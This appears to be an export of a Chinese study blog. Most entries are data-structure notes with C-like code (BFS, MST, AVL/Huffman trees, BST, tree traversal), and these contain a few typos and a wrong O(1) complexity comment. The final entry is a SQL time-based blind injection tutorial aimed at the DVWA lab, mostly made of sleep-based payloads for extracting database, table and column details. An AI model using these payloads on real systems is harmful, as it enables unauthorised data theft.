<h2 id="最短路径问题——BFS算法"><a href="#最短路径问题——BFS算法" class="headerlink" title="最短路径问题——BFS算法"></a>最短路径问题——BFS算法</h2><h3 id="BFS求无权图的单源最短路径"><a href="#BFS求无权图的单源最短路径" class="headerlink" title="BFS求无权图的单源最短路径"></a>BFS求无权图的单源最短路径</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">BFS_Distance</span><span class="params">(Graph G,<span class="type">int</span> u)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;G.vexnum;++i) &#123;</span><br><span class="line">        d[i]=∞;  <span class="comment">//d[i]表示从u到i的最短路径，初始化路径长度</span></span><br><span class="line">        path[i]=<span class="number">-1</span>;  <span class="comment">//最短路径从哪个顶点过来</span></span><br><span class="line">    &#125;</span><br><span class="line">    d[u]=<span class="number">0</span>;</span><br><span class="line">    visited[u]=<span class="literal">true</span>;</span><br><span class="line">    EnQueue(Q,u);</span><br><span class="line">    <span class="keyword">while</span>(!isEmpty(Q)) &#123;		<span class="comment">//BFS算法主过程</span></span><br><span class="line">        DeQueue(Q,u);            <span class="comment">//队头元素出队</span></span><br><span class="line">        <span class="keyword">for</span>(w=FristNeighbor(G,u);w&gt;=<span class="number">0</span>;w=NextNeighbor(G,u,w))</span><br><span class="line">            <span class="keyword">if</span>(!visited[w]) &#123;         <span class="comment">//w为u尚未访问的邻接结点</span></span><br><span class="line">                d[w]=d[u]+<span class="number">1</span>;       <span class="comment">//路径长度+1</span></span><br><span class="line">                path[w]=u;         <span class="comment">//最短路径从u到w</span></span><br><span class="line">                visited[w]=<span class="literal">true</span>;   <span class="comment">//设置已访问标记</span></span><br><span class="line">                EnQueue(Q,w);      <span class="comment">//顶点w入队</span></span><br><span class="line">            &#125; <span class="comment">//if</span></span><br><span class="line">    &#125; <span class="comment">//while</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/22/BFS%E7%AE%97%E6%B3%95/image-20220822152400138.png" alt></p>
<p>算法过程：</p>
<p><img src="/2022/08/22/BFS%E7%AE%97%E6%B3%95/image-20220822153144597.png" alt></p>
<p><img src="/2022/08/22/BFS%E7%AE%97%E6%B3%95/image-20220822153238514.png" alt></p>
<p><img src="/2022/08/22/BFS%E7%AE%97%E6%B3%95/image-20220822153332062.png" alt></p>
<p><img src="/2022/08/22/BFS%E7%AE%97%E6%B3%95/image-20220822153402310.png" alt></p>
<p><img src="/2022/08/22/BFS%E7%AE%97%E6%B3%95/image-20220822153436902.png" alt></p>
<p><img src="/2022/08/22/BFS%E7%AE%97%E6%B3%95/image-20220822153514478.png" alt></p>
<p><img src="/2022/08/22/BFS%E7%AE%97%E6%B3%95/image-20220822153522102.png" alt></p>
<p>三种算法对比<br><img src="/2022/08/22/BFS%E7%AE%97%E6%B3%95/image-20220822170311837.png" alt></p>
]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>图</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>MST的Prim和Kruskal算法</title>
    <url>/2022/08/22/MST/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>最小生成树的prim和kruskai算法的实现思想<br><span id="more"></span></p>
<h2 id="最小生成树-MST"><a href="#最小生成树-MST" class="headerlink" title="最小生成树(MST)"></a>最小生成树(MST)</h2><p>最小生成树可能有多个，但边的权值之和总是唯一且最小的<br>最小生成树的边数=顶点数-1<br>只有连通图才有生成树，非连通图只有生成森林</p>
<h3 id="Prim算法"><a href="#Prim算法" class="headerlink" title="Prim算法"></a>Prim算法</h3><p>从某一个顶点开始构建生成树；每次将代价最小的新顶点纳入生成树，直到所有的顶点都纳入为止</p>
<p><img src="/2022/08/22/MST/image-20220822144757688.png" alt><br><img src="/2022/08/22/MST/image-20220822144926520.png" style="zoom:80%;"></p>
<h3 id="Kruskal算法"><a href="#Kruskal算法" class="headerlink" title="Kruskal算法"></a>Kruskal算法</h3><p>每次挑选一条权值最小的便，使这条边两头连通(原本已经连通的就不选)，直到所有结点都联通<img src="/2022/08/22/MST/image-20220822145315769.png" style="zoom:80%;"><img src="/2022/08/22/MST/image-20220822145256226.png" style="zoom: 80%;"></p>
<h3 id="Prim算法与Kruskal算法"><a href="#Prim算法与Kruskal算法" class="headerlink" title="Prim算法与Kruskal算法"></a>Prim算法与Kruskal算法</h3><p><img src="/2022/08/22/MST/image-20220822145611660.png" alt></p>
<h3 id="Prim算法的实现思想"><a href="#Prim算法的实现思想" class="headerlink" title="Prim算法的实现思想"></a>Prim算法的实现思想</h3><p>初始化<img src="/2022/08/22/MST/image-20220822145817443.png" alt><br>循环遍历所有结点，找到lowcast最低的，且还没加入树的顶点。再次循环遍历，更新还没加入的各个顶点的lowcast值<br>从V0开始，总共需要n-1轮循环，每一轮的时间复杂度O(2n)，所以总时间复杂度为(n-1)O(2n)=O(n^2)，即O(|V|^2)</p>
<h3 id="Kruskal算法的实现思想"><a href="#Kruskal算法的实现思想" class="headerlink" title="Kruskal算法的实现思想"></a>Kruskal算法的实现思想</h3><p><img src="/2022/08/22/MST/image-20220822150435335.png" alt><br>检查第一条边的两个顶点是都连通（是否属于同一个集合)————实现方法：并查集<br>检查第二条边的两个顶点是都连通（是否属于同一个集合)<br>检查第三条边的两个顶点是都连通（是否属于同一个集合)<br>·······<br>检查最后一条边的两个顶点是都连通（是否属于同一个集合)</p>
<script type="math/tex; mode=display">
共执行e轮，每轮判断两个顶点是否属于同一集合，需要O(log_2e)，所以总时间复杂度为O(elog_2e)</script><p>——————《算法导论》</p>
]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>图</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>图的BFS和DFS的代码实现</title>
    <url>/2022/08/22/%E5%9B%BE%E7%9A%84%E9%81%8D%E5%8E%86/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>图的广度优先遍历(BFS)和深度优先遍历(DFS)的代码实现<br><span id="more"></span></p>
<h2 id="图的遍历"><a href="#图的遍历" class="headerlink" title="图的遍历"></a>图的遍历</h2><h3 id="广度优先遍历-BFS"><a href="#广度优先遍历-BFS" class="headerlink" title="广度优先遍历(BFS)"></a>广度优先遍历(BFS)</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> visited[max_vertex_num];            <span class="comment">//访问标记数组</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">BFSTraverse</span><span class="params">(Graph G)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;G.vernuml;++i)</span><br><span class="line">        visited[i]=<span class="literal">false</span>;                <span class="comment">//访问标记数组初始化</span></span><br><span class="line">    InitQueue(Q);                        <span class="comment">//初始化辅助队列Q</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;G.vexnum;++i)              <span class="comment">//从0号顶点开始遍历</span></span><br><span class="line">        <span class="keyword">if</span>(!visited[i])                  <span class="comment">//对每个连通分量调用BFS</span></span><br><span class="line">            BFS(G,i);                    <span class="comment">//vi未访问过，从vi开始BFS</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">BFS</span><span class="params">(Graph G,<span class="type">int</span> v)</span>&#123;                 <span class="comment">//从顶点v出发，广度优先遍历图G</span></span><br><span class="line">    visit(v);                            <span class="comment">//访问初始节点</span></span><br><span class="line">    visited[v]=<span class="literal">true</span>;                     <span class="comment">//对顶点v做访问标记</span></span><br><span class="line">    Enqueue(Q,v);                        <span class="comment">//顶点v入队列Q</span></span><br><span class="line">    <span class="keyword">while</span>(!isEmpty(Q))&#123;</span><br><span class="line">        DeQueue(Q,v);                    <span class="comment">//顶点v出队</span></span><br><span class="line">        <span class="keyword">for</span>(w=FirstNeighbor(G,v);w&gt;=<span class="number">0</span>;w=NextNeighbor(G,v,w))</span><br><span class="line">            <span class="keyword">if</span>(!visited[w])&#123;</span><br><span class="line">                visit(w);                <span class="comment">//w为v的尚未访问的邻接顶点</span></span><br><span class="line">                visited[w]=<span class="literal">true</span>;</span><br><span class="line">                EnQueue(Q,w);</span><br><span class="line">            &#125;<span class="comment">//if</span></span><br><span class="line">    &#125;<span class="comment">//while</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对于无向图，调用BFS函数的次数=连通分量次数</p>
<script type="math/tex; mode=display">
邻接矩阵存储的图，时间复杂度是O(|V|^2)\\
邻接表的广度优先遍历时间复杂度是O(|V|+|E|)</script><p>广度优先生成树，邻接矩阵生成的树是唯一的，邻接表生成的树不一定是唯一的</p>
<h3 id="深度优先遍历-DFS"><a href="#深度优先遍历-DFS" class="headerlink" title="深度优先遍历(DFS)"></a>深度优先遍历(DFS)</h3><p>visited数组防止重复访问</p>
<p><img src="/2022/08/22/%E5%9B%BE%E7%9A%84%E9%81%8D%E5%8E%86/image-20220817160208534-16611666335431.png" alt></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> visited[MAX_VERTEX_NUM];   <span class="comment">//访问标记数组</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">DFSTraverse</span><span class="params">(Graph G)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(v=<span class="number">0</span>;v&lt;G.vexnum;++v)</span><br><span class="line">        visited[v]=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">for</span>(v=<span class="number">0</span>;v&lt;G.vexnum;++v)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!visited[v])</span><br><span class="line">            DFS(G,v);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">DFS</span><span class="params">(Graph G,<span class="type">int</span> v)</span>&#123;</span><br><span class="line">    visit(v);</span><br><span class="line">    visited[v]=<span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span>(w=FirstNeighbor(G,v);w&gt;=<span class="number">0</span>;w=NextNeighor(G,v,w))</span><br><span class="line">        <span class="keyword">if</span>(!visited[w])&#123;</span><br><span class="line">            DFS(G,w);</span><br><span class="line">        &#125;  <span class="comment">//if</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/22/%E5%9B%BE%E7%9A%84%E9%81%8D%E5%8E%86/image-20220822104847638-16611666335442.png" alt></p>
<p><img src="/2022/08/22/%E5%9B%BE%E7%9A%84%E9%81%8D%E5%8E%86/image-20220822111010384-16611666335443.png" alt><img src="/2022/08/22/%E5%9B%BE%E7%9A%84%E9%81%8D%E5%8E%86/image-20220822111023324-16611666335444.png" alt><img src="/2022/08/22/%E5%9B%BE%E7%9A%84%E9%81%8D%E5%8E%86/image-20220822111113241.png" alt><img src="/2022/08/22/%E5%9B%BE%E7%9A%84%E9%81%8D%E5%8E%86/image-20220822111143570.png" alt><img src="/2022/08/22/%E5%9B%BE%E7%9A%84%E9%81%8D%E5%8E%86/image-20220822111202426.png" alt><img src="/2022/08/22/%E5%9B%BE%E7%9A%84%E9%81%8D%E5%8E%86/image-20220822111218447.png" alt><img src="/2022/08/22/%E5%9B%BE%E7%9A%84%E9%81%8D%E5%8E%86/image-20220822111235582.png" alt><img src="/2022/08/22/%E5%9B%BE%E7%9A%84%E9%81%8D%E5%8E%86/image-20220822111255969.png" alt></p>
<p>空间复杂度：来自于递归调用，最坏是O(|V|)，最好是O(1)<br>时间复杂度：邻接矩阵——O(|V|^2)<br>                     邻接表——O(|V|+|E|)</p>
<p>注意处理非连通图（即使用一层for循环遍历图，通过visited数组判断是否已经遍历完成）</p>
<h3 id="广度优先和深度优先的对比"><a href="#广度优先和深度优先的对比" class="headerlink" title="广度优先和深度优先的对比"></a>广度优先和深度优先的对比</h3><p>广度优先使用的是队列，在BFS函数中通过while循环将一层一层入队元素<br>深度优先使用的是栈，在DFS函数中通过递归调用实现将一条路走到底</p>
<p>两种算法的复杂度是一样的，主要是看图的存储方式<br>注：邻接表不一样，得到的深度或者广度优先遍历序列不一样</p>
<p><img src="/2022/08/22/%E5%9B%BE%E7%9A%84%E9%81%8D%E5%8E%86/image-20220822113501088.png" alt><br><img src="/2022/08/22/%E5%9B%BE%E7%9A%84%E9%81%8D%E5%8E%86/image-20220822113548936.png" alt="image-20220822113548936"></p>
<p><img src="/2022/08/22/%E5%9B%BE%E7%9A%84%E9%81%8D%E5%8E%86/image-20220822113606400.png" alt><img src="/2022/08/22/%E5%9B%BE%E7%9A%84%E9%81%8D%E5%8E%86/image-20220822113614038.png" alt></p>
]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>图</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>平衡二叉树以及哈夫曼树和哈夫曼编码</title>
    <url>/2022/08/21/%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>平衡二叉树转换的四种情况解析以及代码实现。哈夫曼树以及哈夫曼编码的原理</p>
<span id="more"></span>
<h2 id="平衡二叉树"><a href="#平衡二叉树" class="headerlink" title="平衡二叉树"></a>平衡二叉树</h2><p>简称平衡树（AVL树）——树上任一结点的左子树和右子树的高度之差不超过1<br><strong>结点的平衡因子</strong>=左子树高-右子树高<br><img src="/2022/08/21/%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220709234821736.png" alt></p>
<h3 id="平衡二叉树的插入"><a href="#平衡二叉树的插入" class="headerlink" title="平衡二叉树的插入"></a>平衡二叉树的插入</h3><p><img src="/2022/08/21/%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220709234957697.png" alt></p>
<p><img src="/2022/08/21/%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220709235020317.png" alt><br><img src="/2022/08/21/%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220709235353920.png" alt="image-20220709235353920"><br>假设的子树的高度一定都是统一的一个值H</p>
<h4 id="LL"><a href="#LL" class="headerlink" title="LL"></a>LL</h4><p><img src="/2022/08/21/%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220709235550956.png" alt></p>
<h4 id="RR"><a href="#RR" class="headerlink" title="RR"></a>RR</h4><p><img src="/2022/08/21/%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220709235832689.png" alt></p>
<h4 id="代码思路"><a href="#代码思路" class="headerlink" title="代码思路"></a>代码思路</h4><p><img src="/2022/08/21/%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220710000110322.png" alt></p>
<h4 id="LR"><a href="#LR" class="headerlink" title="LR"></a>LR</h4><p><img src="/2022/08/21/%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220710000356369.png" alt><br><img src="/2022/08/21/%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220710000444260.png" alt><br><img src="/2022/08/21/%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220710000533083.png" alt></p>
<h4 id="RL"><a href="#RL" class="headerlink" title="RL"></a>RL</h4><p><img src="/2022/08/21/%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220710000716645.png" alt></p>
<p><strong>插入操作导致最小不平衡子树高度+1，经过调整后高度恢复</strong></p>
<h3 id="查找效率问题"><a href="#查找效率问题" class="headerlink" title="查找效率问题"></a>查找效率问题</h3><h3 id="最坏时间复杂度O-h"><a href="#最坏时间复杂度O-h" class="headerlink" title="最坏时间复杂度O(h)"></a>最坏时间复杂度O(h)</h3><p><img src="/2022/08/21/%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220710001904807.png" alt><img src="/2022/08/21/%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220710001932928.png" alt="image-20220710001932928"><br><img src="/2022/08/21/%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220710001948415.png" alt="image-20220710001948415"></p>
<p><img src="/2022/08/21/%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220710002053754.png" alt></p>
<h2 id="哈夫曼树"><a href="#哈夫曼树" class="headerlink" title="哈夫曼树"></a>哈夫曼树</h2><p>结点的权：有某种现实含义（如：表示节点的重要性）<br>结点的带权路径长度：从树的跟到该结点的路径长度（经过的边数）与该结点上权值的乘积<br>树的带权路径长度（WPL)：书中所有的叶子结点的带权路径长度之和<br><img src="/2022/08/21/%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220710002632003.png" alt><br>哈夫曼树的结点总数为2n-1<br>哈夫曼树中不存在度为1的结点<br>哈夫曼树并不唯一，但WPL必然相同且为最优</p>
<h3 id="哈夫曼编码"><a href="#哈夫曼编码" class="headerlink" title="哈夫曼编码"></a>哈夫曼编码</h3><p>固定长度编码——每个字都用相等长度的二进制位表示（ASCII编码）</p>
<p>可变长度编码<img src="/2022/08/21/%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220710003458543.png" alt><br>前缀编码：没有一个编码是另一个编码的前缀</p>
]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>树与二叉树</tag>
      </tags>
  </entry>
  <entry>
    <title>二叉排序树</title>
    <url>/2022/08/21/%E4%BA%8C%E5%8F%89%E6%8E%92%E5%BA%8F%E6%A0%91/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>二叉排序树的原理以及基本操作</p>
<span id="more"></span>
<h2 id="二叉排序树（BST）"><a href="#二叉排序树（BST）" class="headerlink" title="二叉排序树（BST）"></a>二叉排序树（BST）</h2><p>二叉查找树<br><img src="/2022/08/21/%E4%BA%8C%E5%8F%89%E6%8E%92%E5%BA%8F%E6%A0%91/image-20220709231736496.png" alt><br><img src="/2022/08/21/%E4%BA%8C%E5%8F%89%E6%8E%92%E5%BA%8F%E6%A0%91/image-20220709231745186.png" alt><br><img src="/2022/08/21/%E4%BA%8C%E5%8F%89%E6%8E%92%E5%BA%8F%E6%A0%91/image-20220709231900686.png" alt></p>
<h3 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">BSTNode *<span class="title function_">BST_Search</span><span class="params">(BSTree T,<span class="type">int</span> key)</span>&#123;</span><br><span class="line">	<span class="keyword">while</span>(T!=null&amp;&amp;key!=T-&gt;key)&#123;</span><br><span class="line">        <span class="keyword">if</span>(key&lt;T-&gt;key)</span><br><span class="line">            T=T-&gt;lchild;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            T=T-&gt;rchild;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> T;</span><br><span class="line">&#125;<span class="comment">//时间复杂度O(1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//递归实现</span></span><br><span class="line">BSTNode *<span class="title function_">BST_Search</span><span class="params">(BSTree T,<span class="type">int</span> key)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(T==null)</span><br><span class="line">        <span class="keyword">return</span> null;</span><br><span class="line">    <span class="keyword">if</span>(key==T-&gt;key)</span><br><span class="line">        <span class="keyword">return</span> T;    <span class="comment">//查找成功</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(key&lt;T-&gt;key)</span><br><span class="line">        <span class="keyword">return</span> BSTSearch(T-&gt;lchild,key);   <span class="comment">//在左子树中查找</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> BSTSearch(T-&gt;rchild,key);   <span class="comment">//在右子树中查找</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//时间复杂度O(h)</span></span><br></pre></td></tr></table></figure>
<h3 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h3><p><img src="/2022/08/21/%E4%BA%8C%E5%8F%89%E6%8E%92%E5%BA%8F%E6%A0%91/image-20220709232619239.png" alt><br>注意插入操作是引用类型<br>最坏空间复杂度O(h)</p>
<h3 id="构造"><a href="#构造" class="headerlink" title="构造"></a>构造</h3><p><img src="/2022/08/21/%E4%BA%8C%E5%8F%89%E6%8E%92%E5%BA%8F%E6%A0%91/image-20220709232821433.png" alt></p>
<h3 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h3><p><img src="/2022/08/21/%E4%BA%8C%E5%8F%89%E6%8E%92%E5%BA%8F%E6%A0%91/image-20220709233303115.png" alt></p>
<h2 id="查找效率分析"><a href="#查找效率分析" class="headerlink" title="查找效率分析"></a>查找效率分析</h2><p>查找成功的平均长度ASL<br><img src="/2022/08/21/%E4%BA%8C%E5%8F%89%E6%8E%92%E5%BA%8F%E6%A0%91/image-20220709233912561.png" alt></p>
<script type="math/tex; mode=display">
尽可能达到O(log_2n)</script><p>查找失败的平均查找长度<br><img src="/2022/08/21/%E4%BA%8C%E5%8F%89%E6%8E%92%E5%BA%8F%E6%A0%91/image-20220709234322040.png" alt></p>
]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>树与二叉树</tag>
      </tags>
  </entry>
  <entry>
    <title>树和森林的遍历</title>
    <url>/2022/08/19/%E6%A0%91%E5%92%8C%E6%A3%AE%E6%9E%97%E7%9A%84%E9%81%8D%E5%8E%86/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>树的先根后根层次遍历和森林的先序后序遍历的代码实现</p>
<span id="more"></span>
<h2 id="树和森林的遍历"><a href="#树和森林的遍历" class="headerlink" title="树和森林的遍历"></a>树和森林的遍历</h2><h3 id="树的先根遍历"><a href="#树的先根遍历" class="headerlink" title="树的先根遍历"></a>树的先根遍历</h3><p>若树非空，先访问根节点，再依次对每棵子树进行先根遍历</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">PreOrder</span><span class="params">(TreeNode *R)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(R!=null)&#123;</span><br><span class="line">        visit(R);</span><br><span class="line">        <span class="keyword">while</span>(R还有下一个子树T)</span><br><span class="line">            PreOrder(T);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>树的先根遍历与二叉树的先序遍历相同<br>深度优先遍历</p>
<h3 id="树的后根遍历"><a href="#树的后根遍历" class="headerlink" title="树的后根遍历"></a>树的后根遍历</h3><p><img src="/2022/08/19/%E6%A0%91%E5%92%8C%E6%A3%AE%E6%9E%97%E7%9A%84%E9%81%8D%E5%8E%86/image-20220709230748352.png" alt></p>
<p>树的后根遍历与二叉树的中序遍历相同<br>深度优先遍历</p>
<h3 id="树的层次遍历"><a href="#树的层次遍历" class="headerlink" title="树的层次遍历"></a>树的层次遍历</h3><p><img src="/2022/08/19/%E6%A0%91%E5%92%8C%E6%A3%AE%E6%9E%97%E7%9A%84%E9%81%8D%E5%8E%86/image-20220709231031413.png" alt><br>树的层次遍历与二叉树的层序遍历相同<br>广度优先遍历</p>
<h3 id="森林的先序遍历"><a href="#森林的先序遍历" class="headerlink" title="森林的先序遍历"></a>森林的先序遍历</h3><p> <img src="/2022/08/19/%E6%A0%91%E5%92%8C%E6%A3%AE%E6%9E%97%E7%9A%84%E9%81%8D%E5%8E%86/image-20220709231345040.png" alt><br>可以先转换成二叉树，在对二叉树进行先序遍历</p>
<h3 id="森林的中序遍历"><a href="#森林的中序遍历" class="headerlink" title="森林的中序遍历"></a>森林的中序遍历</h3><p><img src="/2022/08/19/%E6%A0%91%E5%92%8C%E6%A3%AE%E6%9E%97%E7%9A%84%E9%81%8D%E5%8E%86/image-20220709231520092.png" alt></p>
<p>可以先转换成二叉树，在对二叉树进行中序遍历<br><img src="/2022/08/19/%E6%A0%91%E5%92%8C%E6%A3%AE%E6%9E%97%E7%9A%84%E9%81%8D%E5%8E%86/image-20220709231626512.png" alt></p>
<h2 id><a href="#" class="headerlink" title=" "></a> </h2>]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>树与二叉树</tag>
      </tags>
  </entry>
  <entry>
    <title>sql时间盲注</title>
    <url>/2022/08/19/sql%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>sql盲注中，给个true和false的可以使用布尔盲注，没有回显的就要使用时间盲注，前提是网络一定要好<br><span id="more"></span></p>
<p>首先要知道的函数</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sleep()<span class="operator">/</span>延迟函数</span><br><span class="line">if(<span class="keyword">condition</span>,<span class="literal">true</span>,<span class="literal">false</span>)<span class="operator">/</span>若条件为真 返回<span class="literal">true</span>，若条件为假 返回<span class="literal">false</span></span><br><span class="line"><span class="built_in">substring</span>(&quot;string&quot;,strart,length)</span><br></pre></td></tr></table></figure>
<h3 id="数据库名长"><a href="#数据库名长" class="headerlink" title="数据库名长"></a>数据库名长</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if(length(database())&gt;X,1,sleep(10))--+</span></span><br></pre></td></tr></table></figure>
<p>如果数据库名长大于X返回1否则睡十秒</p>
<h3 id="数据库名"><a href="#数据库名" class="headerlink" title="数据库名"></a>数据库名</h3><figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">?<span class="built_in">id</span>=<span class="number">1</span>&#x27; <span class="keyword">and</span> <span class="keyword">if</span>((ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>)))&gt;X,<span class="number">1</span>,sleep(<span class="number">10</span>))<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<p>二分法或者爆破法，请参考<a href="/2022/08/18/SQL%E7%9B%B2%E6%B3%A8/" title="SQL盲注">SQL布尔盲注</a></p>
<h3 id="表的个数"><a href="#表的个数" class="headerlink" title="表的个数"></a>表的个数</h3><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">？id=<span class="number">1&#x27;</span> <span class="function"><span class="keyword">and</span> <span class="title">if</span>(<span class="params">(<span class="keyword">select</span> count(*</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema</span>=’dvwa’ limit <span class="number">0</span>,<span class="number">1</span>)=X,<span class="number">1</span>,sleep(<span class="number">10</span>))<span class="meta">#</span></span><br></pre></td></tr></table></figure>
<h3 id="表名长度"><a href="#表名长度" class="headerlink" title="表名长度"></a>表名长度</h3><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">？<span class="attribute">id</span>=1&#x27; <span class="keyword">and</span> <span class="keyword">if</span>(ascii(substr((select table_name <span class="keyword">from</span> information_schema.tables where <span class="attribute">table_schema</span>=’dvwa’ limit 0,1),A,1))&gt;X，1，sleep(10))#</span><br></pre></td></tr></table></figure>
<h3 id="表名"><a href="#表名" class="headerlink" title="表名"></a>表名</h3><figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and if((ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)))&gt;X,<span class="number">1</span>,sleep(<span class="number">10</span>))--+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="字段的数量"><a href="#字段的数量" class="headerlink" title="字段的数量"></a>字段的数量</h3><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>’<span class="keyword">and</span> <span class="keyword">if</span>((<span class="keyword">select</span> count(*) <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> <span class="built_in">table_name</span>=’users’)=X,<span class="number">1</span>,sleep(<span class="number">10</span>)#</span><br></pre></td></tr></table></figure>
